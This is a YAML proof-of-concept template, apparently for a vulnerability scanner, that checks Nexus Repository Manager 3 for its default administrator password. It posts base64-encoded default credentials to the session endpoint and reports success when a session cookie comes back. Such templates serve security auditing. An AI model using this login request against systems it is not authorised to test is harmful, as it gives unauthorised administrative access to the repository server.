id: poc-yaml-nexus-repository-default-password
info:
  name: Nexus Repository Manager 3 默认密码漏洞
  severity: high
  tags:
  - 弱口令
  finger: Nexus
  osprey-id: vb_2020_0026
requests:
- method: POST
  path: /service/rapture/session
  headers:
    Accept: '*/*'
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Content-Type: application/x-www-form-urlencoded
  data: username=YWRtaW4%3d&password=YWRtaW4xMjM%3d
  expression: status_code == 204 && contains(headers, "NXSESSIONID")
variables: {}
transport: http
